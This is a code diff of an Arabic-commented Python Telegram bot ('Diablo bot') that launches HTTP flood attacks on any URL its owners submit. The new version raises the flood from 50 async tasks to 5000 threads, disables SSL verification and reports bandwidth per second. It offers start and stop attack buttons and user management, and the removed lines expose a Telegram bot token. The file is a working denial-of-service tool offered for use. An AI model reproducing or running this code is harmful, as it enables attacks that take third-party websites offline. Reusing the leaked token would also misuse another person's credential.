@@ -1,164 +1,186 @@
-import aiohttp
-import asyncio
+import requests
+import threading
 import urllib3
+import time
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.utils import executor
 
-# إعداد الـ logging
-logging.basicConfig(level=logging.INFO)
+# إعداد السجلات مع مستوى تصحيح أكثر تفصيلاً
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # تعطيل التحقق من صحة شهادة SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 fake_ip = '182.21.20.32'
 
+# إعداد الرؤوس القياسية لجلسة requests
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
+                  '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
 }
 
+# إنشاء جلسة واحدة للاستخدام المتكرر
+session = requests.Session()
+session.verify = False
+session.headers.update(headers)
+
+# متغيرات للتحكم في الهجوم
 bytes_transferred = 0
-stop_attack_event = asyncio.Event()
+lock = threading.Lock()
+stop_attack_event = threading.Event()
 
-Owner = ['6358035274']
-NormalUsers = ['5708651947']
+# قراءة ربما قائمة معينة من المستخدمين
+Owner = []
+NormalUsers = []
 
-def load_lists():
-    global Owner, NormalUsers
+def read_users():
     try:
-        with open('owner.txt', 'r') as file:
-            Owner = file.read().splitlines()
-        with open('normal_users.txt', 'r') as file:
-            NormalUsers = file.read().splitlines()
+        with open('owners.txt', 'r') as file:
+            Owner.extend(file.read().splitlines())
     except FileNotFoundError:
-        pass
+        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
 
-load_lists()
+    try:
+        with open('normal_users.txt', 'r') as file:
+            NormalUsers.extend(file.read().splitlines())
+    except FileNotFoundError:
+        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
 
-async def attack(url, session):
+read_users()
+
+def attack(url):
+    """تنفيذ الهجوم عبر إرسال طلبات متتابعة"""
     global bytes_transferred
     while not stop_attack_event.is_set():
         try:
-            async with session.get(url, headers=headers) as response:
-                content = await response.read()
-                bytes_transferred += len(content)
-                print("تم إرسال الطلب إلى:", url)
-        except Exception as e:
-            print("حدث خطأ:", e)
+            response = session.get(url)
+            with lock:
+                bytes_transferred += len(response.content)
+            logging.debug(f"تم إرسال الطلب إلى: {url}")
+        except requests.RequestException as e:
+            logging.error(f"حدث خطأ: {e}")
 
-async def start_attack(url):
+def start_attack(url):
+    """بدء الهجوم عبر عدة خيوط"""
     stop_attack_event.clear()
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-        tasks = []
-        for _ in range(50):  # استخدام عدد أقل لتجنب المشاكل
-            tasks.append(attack(url, session))
-        
-        await asyncio.gather(*tasks)
+    with ThreadPoolExecutor(max_workers=1000) as executor:
+        tasks = [executor.submit(attack, url) for _ in range(5000)]
+
+    for task in tasks:
+        try:
+            task.result()
+        except Exception as e:
+            logging.error(f"خطأ في تنفيذ الخيط: {e}")
 
 def stop_attack():
+    """إيقاف الهجوم"""
     stop_attack_event.set()
-    print("تم إيقاف الهجوم.")
+    logging.info("تم إيقاف الهجوم.")
 
-async def calculate_speed():
+def calculate_speed():
+    """حساب سرعة النقل ومراقبة الأداء"""
     global bytes_transferred
     while not stop_attack_event.is_set():
-        await asyncio.sleep(1)
-        speed = bytes_transferred / (1024 * 1024)
-        bytes_transferred = 0
-        print(f"سرعة النقل: {speed:.2f} MB/s")
+        time.sleep(1)
+        with lock:
+            speed = bytes_transferred / (1024 * 1024)
+            bytes_transferred = 0
+        logging.info(f"سرعة النقل: {speed:.2f} MB/s")
 
-TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # استبدل برمز التوكن الخاص بك
-bot = Bot(token=TOKEN)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
+# يجب تعيين التوكن بشكل مباشر
+TOKEN = 'YOUR_BOT_TOKEN'  # هنا يجب أن تضع توكن البوت الخاص بك
+if not TOKEN:
+    logging.error("Bot token is not defined")
+    raise Exception('Bot token is not defined')
+
+bot = telebot.TeleBot(TOKEN)
 
 def is_owner(user_id):
+    """التحقق من صحة المالك"""
     return str(user_id) in Owner
 
-class Form(StatesGroup):
-    add_user = State()
-    remove_user = State()
-    start_attack = State()
-
-@dp.message_handler(commands=['start'])
-async def send_welcome(message: types.Message):
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    """التعامل مع رسالة البدء من المستخدم"""
     if is_owner(message.from_user.id):
-        await message.reply("مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
+        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
+    else:
+        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+
+    if is_owner(message.from_user.id):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
         markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
         markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
-        await bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
-    else:
-        await message.reply("أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
 
-@dp.callback_query_handler(lambda call: call.data == "add_user")
-async def callback_add_user(call: types.CallbackQuery):
-    if is_owner(call.from_user.id):
-        await Form.add_user.set()
-        await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
-
-@dp.callback_query_handler(lambda call: call.data == "remove_user")
-async def callback_remove_user(call: types.CallbackQuery):
-    if is_owner(call.from_user.id):
-        await Form.remove_user.set()
-        await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
-
-@dp.callback_query_handler(lambda call: call.data == "start_attack")
-async def callback_start_attack(call: types.CallbackQuery):
-    if is_owner(call.from_user.id):
-        await Form.start_attack.set()
-        await bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
-
-@dp.callback_query_handler(lambda call: call.data == "stop_attack")
-async def callback_stop_attack(call: types.CallbackQuery):
-    if is_owner(call.from_user.id):
+@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
+def callback_query(call):
+    """التعامل مع الردود التفاعلية"""
+    if call.data == "add_user":
+        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
+        bot.register_next_step_handler(msg, process_add_user)
+    elif call.data == "remove_user":
+        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
+        bot.register_next_step_handler(msg, process_remove_user)
+    elif call.data == "start_attack":
+        msg = bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
+        bot.register_next_step_handler(msg, process_start_attack)
+    elif call.data == "stop_attack":
         stop_attack()
-        await bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
+        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
 
-@dp.message_handler(state=Form.add_user)
-async def process_add_user(message: types.Message, state: FSMContext):
-    new_user = message.text.strip()
-    if new_user not in NormalUsers:
-        NormalUsers.append(new_user)
+def process_add_user(message):
+    """إضافة مستخدم إلى القائمة"""
+    user_id = message.text
+    if user_id:
         with open('normal_users.txt', 'a') as file:
-            file.write(f"{new_user}\n")
-        await bot.send_message(message.chat.id, f"تمت إضافة المستخدم: {new_user}")
+            file.write(user_id + '\n')
+        NormalUsers.append(user_id)
+        bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
+        logging.info("تمت إضافة المستخدم بنجاح.")
     else:
-        await bot.send_message(message.chat.id, "المستخدم موجود بالفعل في القائمة.")
-    await state.finish()
+        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
+        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")
 
-@dp.message_handler(state=Form.remove_user)
-async def process_remove_user(message: types.Message, state: FSMContext):
-    user_to_remove = message.text.strip()
-    if user_to_remove in NormalUsers:
-        NormalUsers.remove(user_to_remove)
+def process_remove_user(message):
+    """إزالة مستخدم من القائمة"""
+    user_id = message.text
+    if user_id in NormalUsers:
         with open('normal_users.txt', 'w') as file:
             for user in NormalUsers:
-                file.write(f"{user}\n")
-        await bot.send_message(message.chat.id, f"تمت إزالة المستخدم: {user_to_remove}")
+                if user != user_id:
+                    file.write(user + '\n')
+        NormalUsers.remove(user_id)
+        bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
+        logging.info("تمت إزالة المستخدم بنجاح.")
     else:
-        await bot.send_message(message.chat.id, "المستخدم غير موجود في القائمة.")
-    await state.finish()
+        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
+        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")
 
-@dp.message_handler(state=Form.start_attack)
-async def process_start_attack(message: types.Message, state: FSMContext):
-    url = message.text.strip()
+def process_start_attack(message):
+    """بدء هجوم على الهدف المحدد"""
+    url = message.text
     if url:
-        await bot.send_message(message.chat.id, f"بدء الهجوم على: {url}")
-
-        speed_task = asyncio.create_task(calculate_speed())
-        attack_task = asyncio.create_task(start_attack(url))
-
-        await asyncio.gather(speed_task, attack_task)
+        bot.reply_to(message, f"بدء الهجوم على: {url}")
+        speed_thread = threading.Thread(target=calculate_speed, daemon=True)
+        speed_thread.start()
+        attack_thread = threading.Thread(target=start_attack, args=(url,))
+        attack_thread.start()
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
+        bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
     else:
-        await bot.send_message(message.chat.id, "لم يتم إدخال رابط الهدف بشكل صحيح.")
-    await state.finish()
+        bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
+        logging.warning("فشل في إدخال رابط الهدف بشكل صحيح.")
+
+def main():
+    """تشغيل البوت"""
+    bot.polling()
 
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
+    main()
